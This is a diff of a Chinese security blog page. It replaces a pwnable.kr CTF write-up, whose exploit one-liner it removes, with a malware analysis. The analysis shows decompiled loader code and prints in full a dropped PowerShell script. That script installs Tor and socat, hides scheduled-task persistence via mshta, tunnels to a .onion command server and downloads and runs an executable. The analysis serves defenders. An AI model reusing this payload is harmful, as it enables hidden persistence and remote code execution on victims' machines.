@@ -12,23 +12,20 @@
   
   <script>hljs.initHighlightingOnLoad();</script>
 
-  <title>pwnable.kr mistake | ydc&#39;s blog</title>
+  <title>调用jscript引擎接口的malware分析 | ydc&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="分析源码，发现下面这段代码有点可疑。 fd=open(&amp;quot;/home/mistake/password&amp;quot;,O_RDONLY,0400) &amp;lt; 0 熟悉Linux的童鞋都知道文件描述符是不可能小于0的。计算得fd等于0，因为”&amp;lt;”比”=”优先级高，先计算等式右边，打开的文件描述符不可能小于0，因此右边等式等于0，最后fd=0；文件描述符为0是标准输入，也就是说这个程序实">
-<meta name="keywords" content="Pwnable">
+  <meta name="description" content="文件SHA256: f47717a4ae920921b69e8fd590c7a6353be08cad3cfc1a438c490b38e248d3f7  用IDA反编译代码,入口处函数如下：   主要功能解密jscript代码，通过com调用脚本引擎来执行脚本代码  int __cdecl main(int argc, const char argv, const char envp){">
+<meta name="keywords" content="病毒分析">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr mistake">
-<meta property="og:url" content="http://yoursite.com/posts/f6e7b5bf.html">
+<meta property="og:title" content="调用jscript引擎接口的malware分析">
+<meta property="og:url" content="http://yoursite.com/posts/6193d55c.html">
 <meta property="og:site_name" content="ydc&#39;s blog">
-<meta property="og:description" content="分析源码，发现下面这段代码有点可疑。 fd=open(&amp;quot;/home/mistake/password&amp;quot;,O_RDONLY,0400) &amp;lt; 0 熟悉Linux的童鞋都知道文件描述符是不可能小于0的。计算得fd等于0，因为”&amp;lt;”比”=”优先级高，先计算等式右边，打开的文件描述符不可能小于0，因此右边等式等于0，最后fd=0；文件描述符为0是标准输入，也就是说这个程序实">
+<meta property="og:description" content="文件SHA256: f47717a4ae920921b69e8fd590c7a6353be08cad3cfc1a438c490b38e248d3f7  用IDA反编译代码,入口处函数如下：   主要功能解密jscript代码，通过com调用脚本引擎来执行脚本代码  int __cdecl main(int argc, const char argv, const char envp){">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://t.cn/RGRNYlx">
-<meta property="og:image" content="http://t.cn/RGRNH93">
-<meta property="og:updated_time" content="2018-04-04T16:57:40.434Z">
+<meta property="og:updated_time" content="2018-04-22T06:07:47.816Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr mistake">
-<meta name="twitter:description" content="分析源码，发现下面这段代码有点可疑。 fd=open(&amp;quot;/home/mistake/password&amp;quot;,O_RDONLY,0400) &amp;lt; 0 熟悉Linux的童鞋都知道文件描述符是不可能小于0的。计算得fd等于0，因为”&amp;lt;”比”=”优先级高，先计算等式右边，打开的文件描述符不可能小于0，因此右边等式等于0，最后fd=0；文件描述符为0是标准输入，也就是说这个程序实">
-<meta name="twitter:image" content="http://t.cn/RGRNYlx">
+<meta name="twitter:title" content="调用jscript引擎接口的malware分析">
+<meta name="twitter:description" content="文件SHA256: f47717a4ae920921b69e8fd590c7a6353be08cad3cfc1a438c490b38e248d3f7  用IDA反编译代码,入口处函数如下：   主要功能解密jscript代码，通过com调用脚本引擎来执行脚本代码  int __cdecl main(int argc, const char argv, const char envp){">
   
     <link rel="alternative" href="/atom.xml" title="ydc&#39;s blog" type="application/atom+xml">
   
@@ -210,11 +207,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-pwnable-kr-mistake" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-c-读取WPD设备详细信息" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/posts/f6e7b5bf.html" class="article-date">
-      <time datetime="2016-01-31T15:34:20.000Z" itemprop="datePublished">2016-01-31</time>
+      <a href="/posts/6193d55c.html" class="article-date">
+      <time datetime="2018-04-22T03:11:34.000Z" itemprop="datePublished">2018-04-22</time>
 </a>
     </div>
   
@@ -227,7 +224,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      pwnable.kr mistake
+      调用jscript引擎接口的malware分析
     </h1>
   
 
@@ -235,14 +232,10 @@
       
       <div class="article-info article-info-post">
         
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/challenge/">challenge</a>
-    </div>
-
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwnable/">Pwnable</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/病毒分析/">病毒分析</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -252,23 +245,197 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><img src="http://t.cn/RGRNYlx" alt=""></p>
-<p>分析源码，发现下面这段代码有点可疑。</p>
-<pre><code>fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0
-</code></pre><p>熟悉Linux的童鞋都知道文件描述符是不可能小于0的。计算得fd等于0，因为”&lt;”比”=”优先级高，先计算等式右边，打开的文件描述符不可能小于0，因此右边等式等于0，最后fd=0；<br>文件描述符为0是标准输入，也就是说这个程序实际上并没有读取password文件，而是从标准输入中读取数据。</p>
-<p>继续往下看，有个比较，两个buff相等则输出flag。</p>
-<pre><code class="cpp">if(!strncmp(pw_buf, pw_buf2, PW_LEN)){     
-      printf(&quot;Password OK\n&quot;);           
-      system(&quot;/bin/cat flag\n&quot;);         
-}                                          
+        <blockquote>
+<p>文件SHA256: f47717a4ae920921b69e8fd590c7a6353be08cad3cfc1a438c490b38e248d3f7</p>
+</blockquote>
+<p>用IDA反编译代码,入口处函数如下：</p>
+<pre><code>  主要功能解密jscript代码，通过com调用脚本引擎来执行脚本代码
+</code></pre> <body bgcolor="#232323"><br><span style="white-space: pre; font-family: Consolas;  "><br><span style="color:#73adad">int __cdecl main(int argc, const char <strong>argv, const char </strong>envp)<br></span><span><span>{                                                                                           </span></span><br>  <span style="color:#73adad">JSEngine <em>v3</em></span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST20_4<br>  </span><span style="color:#73adad">JSEngine v4</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST18_4<br>  </span><span style="color:#73adad">unsigned int i</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+1Ch] [ebp-14h]<br>  </span><span style="color:#73adad">encry_code *a2</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+20h] [ebp-10h]<br><br>  </span><span style="color:#f187ff">FreeConsole</span><span style="color:#c0c0c0">();<br>  </span><span style="color:#00ffff">a2 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">operator new</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">8u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;size = </span><span style="color:#ababab">0x14C88</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;js_code = </span><span style="color:#ffecbb">operator new[]</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;size);<br>  </span><span style="color:#ababab">for </span><span style="color:#c0c0c0">( </span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">; </span><span style="color:#00ffff">i &lt; a2</span><span style="color:#c0c0c0">-&gt;size; ++</span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">)<br>    </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;js_code[</span><span style="color:#00ffff">i</span><span style="color:#c0c0c0">] = </span><span style="color:#ffecbb">encrypt_code</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">i</span><span style="color:#c0c0c0">];<br>  </span><span style="color:#ffecbb">decrypt_code</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;js_code, </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;size - </span><span style="color:#ababab">1</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v3 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">operator new</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">0x10u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ffecbb">memset</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v3</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0x10u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v4 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">init_com</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v3</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ffecbb">run_jscript</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v4</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ffecbb">sub_862F90</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v4</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ababab">return 0</span><span style="color:#c0c0c0">;<br></span><span style="background:#646464"></span><span style="background:#ababab"></span><span><span>} </span></span><br></span></body>
+
+
+
+<h2 id="jscript代码解密"><a href="#jscript代码解密" class="headerlink" title="jscript代码解密"></a>jscript代码解密</h2><pre><code>    解密方式也比较简单，主要就是通过xor来解密
+</code></pre><body bgcolor="#232323"><br><span style="white-space: pre; font-family: Consolas; "><br><br><span style="color:#73adad">_BYTE <em>__cdecl decrypt_code(char </em>a1, unsigned int size)<br></span><span><span>{</span></span><br>  <span style="color:#ffd200">_BYTE <em>v2</em></span><span style="color:#c0c0c0">; </span><span style="color:#ffd200">// </span><span style="color:#00ffff">edx<br>  </span><span style="color:#73adad">_BYTE result</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">eax<br>  </span><span style="color:#73adad">unsigned int v4</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+0h] [ebp-1Ch]<br>  </span><span style="color:#ffd200">_BYTE <em>v5</em></span><span style="color:#c0c0c0">; </span><span style="color:#ffd200">// </span><span style="color:#00ffff">[esp+10h] [ebp-Ch]<br>  </span><span style="color:#73adad">unsigned int i</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+14h] [ebp-8h]<br>  </span><span style="color:#73adad">unsigned int j</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+18h] [ebp-4h]<br><br>  v4 </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0x7FFFFFFF </span><span style="color:#c0c0c0">- </span><span style="color:#ababab">8</span><span style="color:#c0c0c0"></span><span style="color:#ffecbb">fun</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">size</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">6</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">result </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">operator new</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">1u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v5 </span><span style="color:#c0c0c0">= </span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#00ffff">v2 </span><span style="color:#c0c0c0">= </span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#ffecbb">LOBYTE</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">) = </span><span style="color:#ababab">4</span><span style="color:#c0c0c0">;
+  </span><span style="color:#00ffff">v2 </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">4</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#ff633c">// 生成xor key<br>  </span><span style="color:#ababab">for </span><span style="color:#c0c0c0">( </span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">; </span><span style="color:#00ffff">i &lt; </span><span style="color:#ababab">4</span><span style="color:#c0c0c0">; ++</span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">)<br>  {<br>    </span><span style="color:#00ffff">v5</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">i</span><span style="color:#c0c0c0">] = </span><span style="color:#00ffff">v4 &gt;&gt; </span><span style="color:#ababab">8 </span><span style="color:#c0c0c0">* </span><span style="color:#00ffff">i</span><span style="color:#c0c0c0">;<br>    </span><span style="color:#00ffff">result </span><span style="color:#c0c0c0">= (</span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">1</span><span style="color:#c0c0c0">);<br>  </span><span style="background:#c0c0c0"></span><span style="color:#c0c0c0">}<br>  </span><span style="color:#ababab">for </span><span style="color:#c0c0c0">( </span><span style="color:#00ffff">j </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">; </span><span style="color:#00ffff">j &lt; size</span><span style="color:#c0c0c0">; ++</span><span style="color:#00ffff">j </span><span style="color:#c0c0c0">)<br>  {<br>    </span><span style="color:#00ffff">result </span><span style="color:#c0c0c0">= (</span><span style="color:#00ffff">v5</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">j </span><span style="color:#c0c0c0">% </span><span style="color:#ababab">4</span><span style="color:#c0c0c0">] ^ </span><span style="color:#00ffff">a1</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">j</span><span style="color:#c0c0c0">]);<br>    </span><span style="color:#00ffff">a1</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">j</span><span style="color:#c0c0c0">] = </span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">;<br>  </span><span style="background:#00ffff"></span><span style="color:#c0c0c0">}<br>  </span><span style="color:#ababab">return </span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">;<br></span><span style="background:#646464"></span><span style="background:#00ffff"></span><span><span style="color:#c0c0c0">} </span></span><br></span></body>
+
+
+<h3 id="脚本行为"><a href="#脚本行为" class="headerlink" title="脚本行为"></a>脚本行为</h3><p>脚本会释放出一个powershell脚本，可能是c2c连接已经失效，后续的行为没跑出来</p>
+<pre><code class="powershell">$SH_TYPE_SCHEDULED_TASK=1;
+$SH_TYPE_TASK_SCHEDULER=2;
+$schedulerType=$SH_TYPE_SCHEDULED_TASK;
+function FVRClsggMRAZ
+{
+param([string]$zipfile, [string]$destination);
+$7z = Join-Path $env:ALLUSERSPROFILE &#39;7za.exe&#39;;
+if (-NOT (Test-Path $7z)){
+Try
+{
+(New-Object System.Net.WebClient).DownloadFile(&#39;https://chocolatey.org/7za.exe&#39;,$7z);
+}
+Catch{}
+}
+if ($(Try { Test-Path $7z.trim() } Catch { $false })){
+Start-Process &quot;$7z&quot; -ArgumentList &quot;x -o`&quot;$destination`&quot; -y `&quot;$zipfile`&quot;&quot; -Wait -NoNewWindow
+}
+else{
+$shell = new-object -com shell.application;
+$zip = $shell.NameSpace($zipfile);
+foreach($item in $zip.items())
+{
+$shell.Namespace($destination).copyhere($item);
+}
+}
+}
+function Base64ToFile
+{
+param([string]$file, [string]$string);
+$bytes=[System.Convert]::FromBase64String($string);
+#set-content -encoding byte $file -value $bytes;
+[IO.File]::WriteAllBytes($file, $bytes);
+}
+function RandomString{
+    param([int]$min=5, [int]$max=15);
+    return (-join ((48..57)+(65..90)+(97..122) | Get-Random -Count (Get-Random -minimum $min -maximum $max) | % {[char]$_}));
+}
+function InitScheduller{
+    try{
+        Import-Module ScheduledTasks -ErrorAction Stop;
+        return $SH_TYPE_SCHEDULED_TASK;
+    }catch{
+        $File=$env:Temp+&#39;\&#39;+(RandomString)+&#39;.zip&#39;;
+        $Dest=$env:Temp+&#39;\&#39;+(RandomString);
+        while (!(iGgRLcyIJQBzrA &#39;https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg&#39; $File)) {}
+        if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}mkdir $Dest | Out-Null;
+        FVRClsggMRAZ $File $Dest;
+        Remove-Item -Force $File;
+        $TSAssembly=$Dest+&#39;\lib\net20\Microsoft.Win32.TaskScheduler.dll&#39;;
+        $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
+        return $SH_TYPE_TASK_SCHEDULER;
+    }
+}
+function xrnOlrj
+{
+param([string]$name, [string]$cmd, [string]$params=&#39;&#39;,[int]$restart=0,[int]$delay=0,[string]$dir=&#39;&#39;);
+switch ($schedulerType) {
+    $SH_TYPE_SCHEDULED_TASK {
+        $Action = New-ScheduledTaskAction -Execute $cmd;
+        if(-Not [String]::IsNullOrEmpty($params)){
+            $Action.Arguments=$params;
+        }
+        if(-Not [String]::IsNullOrEmpty($dir)){
+            $Action.WorkingDirectory=$dir;
+        }
+        $LogonTrigger = New-ScheduledTaskTrigger -AtLogOn;
+        try{
+            $LogonTrigger.UserId=$env:username;
+        }catch{
+            $LogonTrigger.User=$env:username;
+        }
+        if(-Not $delay -eq 0){
+            $LogonTrigger.Delay=New-TimeSpan -Seconds $delay;
+        }
+        if($restart -eq 1){
+            $TimeTrigger = New-ScheduledTaskTrigger -Once -At 12am -RepetitionInterval ([System.TimeSpan]::FromMinutes(1)) -RepetitionDuration ([System.TimeSpan]::FromDays(365 * 20));
+        }
+        $Settings = New-ScheduledTaskSettingsSet;
+        $Settings.DisallowStartIfOnBatteries = $False;
+        $Settings.StopIfGoingOnBatteries = $False;
+        if($restart -eq 1){
+            $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger,$TimeTrigger -Settings $Settings -TaskName $name -Description (RandomString);
+        }else{
+            $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger -Settings $Settings -TaskName $name -Description (RandomString);
+        }
+        Start-ScheduledTask -InputObject $Task;
+    };
+    Default {
+        $ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
+        $td=$ts.NewTask();
+        $td.RegistrationInfo.Description = (RandomString);
+        $td.Settings.DisallowStartIfOnBatteries = $False;
+        $td.Settings.StopIfGoingOnBatteries = $False;
+        $td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
+        $LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
+        $LogonTrigger.StartBoundary=[System.DateTime]::Now;
+        $LogonTrigger.UserId=$env:username;
+        $LogonTrigger.Delay=[System.TimeSpan]::FromSeconds($delay);
+        $td.Triggers.Add($LogonTrigger);
+        if($restart -eq 1){
+        $TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;
+        $TimeTrigger.StartBoundary=[System.DateTime]::Now;
+        $TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(1);
+        $TimeTrigger.Repetition.StopAtDurationEnd=$False;
+        $td.Triggers.Add($TimeTrigger);
+        }
+        $tsf=&quot;Microsoft.Win32.TaskScheduler&quot;;
+        $ExecAction=New-Object &quot;$tsf.ExecAction&quot;($cmd,$params,$dir);
+        $td.Actions.Add($ExecAction);
+        $task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
+        $task.Run();
+    };
+}
+}
+function iGgRLcyIJQBzrA {
+    param([string]$AETLcnitKnaNqr, [string]$aEntsBMtsayB);
+    $ErrorActionPreference = &quot;Stop&quot;;
+    Write-Host (&quot;Download {0} to {1}&quot; -f ($AETLcnitKnaNqr, $aEntsBMtsayB));
+    try {
+        Start-BitsTransfer -Source $AETLcnitKnaNqr -Destination $aEntsBMtsayB;
+    }
+    catch {
+        #Write-Error $_ -ErrorAction Continue;
+        try {
+            (New-Object System.Net.WebClient).DownloadFile($AETLcnitKnaNqr,$aEntsBMtsayB);
+        }
+        catch {
+            #Write-Error $_ -ErrorAction Continue;
+            Start-Process &quot;cmd.exe&quot; -ArgumentList &quot;/b /c bitsadmin /transfer /download /priority HIGH `&quot;$AETLcnitKnaNqr`&quot; `&quot;$aEntsBMtsayB`&quot;&quot; -Wait -WindowStyle Hidden;
+        }
+    }finally{
+        $ErrorActionPreference = &quot;Continue&quot;;
+    }
+    if ( $(Try { Test-Path $aEntsBMtsayB.trim() } Catch { $false })){
+        return $true;
+    }
+    return $false;
+}
+function IwoPMc{
+$schedulerType = InitScheduller;
+$tf=$env:Temp+&#39;\&#39;+(RandomString)+&#39;.zip&#39;;
+$DestTP=$env:ALLUSERSPROFILE+&#39;\&#39;+(RandomString);
+$TorMirrors=@(&quot;https://dist.torproject.org/&quot;,
+&quot;https://torproject.mirror.metalgamer.eu/dist/&quot;,
+&quot;https://tor.ybti.net/dist/&quot;);
+foreach ($mirror in $TorMirrors) {
+    $_url=$mirror+&#39;torbrowser/7.0.11/tor-win32-0.3.1.9.zip&#39;;
+    if((iGgRLcyIJQBzrA $_url $tf)){
+        break;
+    }
+}
+if ((Test-Path $DestTP) -eq 1){Remove-Item -Force -Recurse $DestTP;}mkdir $DestTP | Out-Null;
+FVRClsggMRAZ $tf $DestTP;
+Remove-Item -Force $tf;
+$ykF=$DestTP+&#39;\Tor\&#39;;
+$WqPfv=&quot;vbscript:close(CreateObject(`&quot;WScript.Shell`&quot;).Run(`&quot;tor.exe`&quot;,0,False))&quot;;
+xrnOlrj (RandomString) &#39;mshta.exe&#39; $WqPfv 0 0 $ykF;
+$SFile=$env:Temp+&#39;\&#39;+(RandomString)+&#39;.zip&#39;;
+while (!(iGgRLcyIJQBzrA &#39;https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip&#39; $SFile)){}
+FVRClsggMRAZ $SFile $DestTP;
+$s_old=$DestTP+&#39;\socat-windows-1.7.2.1\&#39;;
+$s_new=(RandomString);
+Remove-Item -Force $SFile;
+Rename-Item -path $s_old -newName $s_new;
+$dLkdOdvs=$DestTP+&#39;\&#39;+$s_new+&#39;\&#39;;
+$s1cmd=&#39;socat tcp4-LISTEN:5555,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:qr5c2etn6x5lhhfc.onion:80,socksport=9050&#39;;
+$s2cmd=&#39;socat tcp4-LISTEN:5588,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:qr5c2etn6x5lhhfc.onion:5588,socksport=9050&#39;;
+$SyASxV=&quot;vbscript:close(CreateObject(`&quot;WScript.Shell`&quot;).Run(`&quot;$s1cmd`&quot;,0,False))&quot;;
+$CkeHaEMoQb=&quot;vbscript:close(CreateObject(`&quot;WScript.Shell`&quot;).Run(`&quot;$s2cmd`&quot;,0,False))&quot;;
+xrnOlrj (RandomString) &#39;mshta.exe&#39; $SyASxV 0 0 $dLkdOdvs;
+xrnOlrj (RandomString) &#39;mshta.exe&#39; $CkeHaEMoQb 0 0 $dLkdOdvs;
+$wXdRbCFwn=&quot;vbsc&quot;+&quot;ript:close(CreateObject(`&quot;WScript.Shell`&quot;).Run(`&quot;powershell.exe `&quot;`&quot;`$F=`$env:Temp+&#39;\\&quot;+(RandomString)+&quot;.exe&#39;;rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile(&#39;http://127.0.0.1:5555/&quot;+(RandomString)+&quot;.asp?ts&amp;ip=&#39;+`$cl.Download`&quot;+`&quot;String(&#39;http://api.ipify.org/&#39;),`$F);&amp; `$F`&quot;`&quot;`&quot;,0,False))&quot;;
+xrnOlrj (RandomString) &#39;mshta.exe&#39; $wXdRbCFwn 1;
+}
+IwoPMc;
 </code></pre>
-<p>这样，我们只要构造一个满足条件的buffer通过管道传给mistake。buffer满足下面这个条件就能成功拿到key。</p>
-<pre><code class="c">pw_buf = pw_buf2^0x1111111111
-</code></pre>
-<p>执行如下命令。</p>
-<pre><code class="bash">(python -c &quot;print &#39;\x12&#39;*10 + &#39;\x13&#39;*10 &quot;) | ./mistake
-</code></pre>
-<p><img src="http://t.cn/RGRNH93" alt=""></p>
 
       
       
@@ -324,13 +491,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/posts/f6e7b5bf.html">pwnable.kr mistake</a></p>
+        <p><span>本文标题:</span><a href="/posts/6193d55c.html">调用jscript引擎接口的malware分析</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Ken 的个人博客">Ken</a></p>
-        <p><span>发布时间:</span>2016年01月31日 - 23时34分</p>
-        <p><span>最后更新:</span>2018年04月05日 - 00时57分</p>
+        <p><span>发布时间:</span>2018年04月22日 - 11时11分</p>
+        <p><span>最后更新:</span>2018年04月22日 - 14时07分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/posts/f6e7b5bf.html" title="pwnable.kr mistake">http://yoursite.com/posts/f6e7b5bf.html</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/posts/f6e7b5bf.html　　作者: Ken" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/posts/6193d55c.html" title="调用jscript引擎接口的malware分析">http://yoursite.com/posts/6193d55c.html</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/posts/6193d55c.html　　作者: Ken" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -343,18 +510,9 @@
 
 <nav id="article-nav">
   
-    <a href="/posts/84f4a8fe.html" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          python爬虫实战:Oculus VR
-        
-      </div>
-    </a>
   
-  
-    <a href="/posts/9e24c54e.html" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">安卓游戏资源解密</div>
+    <a href="/posts/77d5c310.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">windows内核学习:SSDT Hook</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -365,7 +523,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#jscript代码解密"><span class="toc-number">1.</span> <span class="toc-text">jscript代码解密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#脚本行为"><span class="toc-number">1.1.</span> <span class="toc-text">脚本行为</span></a></li></ol></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -431,13 +589,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/posts/84f4a8fe.html" title="上一篇: python爬虫实战:Oculus VR">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/posts/9e24c54e.html" title="下一篇: 安卓游戏资源解密">
+            <a href="/posts/77d5c310.html" title="下一篇: windows内核学习:SSDT Hook">
                 <i class="fa fa-angle-right"></i>
             </a>
         
